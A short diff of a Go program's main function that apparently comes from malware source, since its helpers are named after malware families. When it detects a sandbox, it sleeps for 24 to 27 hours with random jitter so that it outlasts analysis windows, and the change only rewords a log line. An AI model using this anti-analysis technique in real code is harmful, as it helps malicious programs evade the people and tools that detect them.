@@ -270,10 +270,10 @@ func main() {
 	deoxys("main: Protocol version: %s", buildTag)
 	revilSingleInstance()
 	if winnti() {
-		deoxys("main: Sandbox detected, entering benign sleep")
 		// Sleep 24-27h — outlasts sandbox analysis windows without
 		// producing a suspicious immediate exit.
 		jitter := time.Duration(24*3600+rand.Intn(3*3600)) * time.Second
+		deoxys("main: Sandbox/analysis environment confirmed (see winnti logs above), sleeping %v before exit", jitter)
 		time.Sleep(jitter)
 		os.Exit(0)
 	}
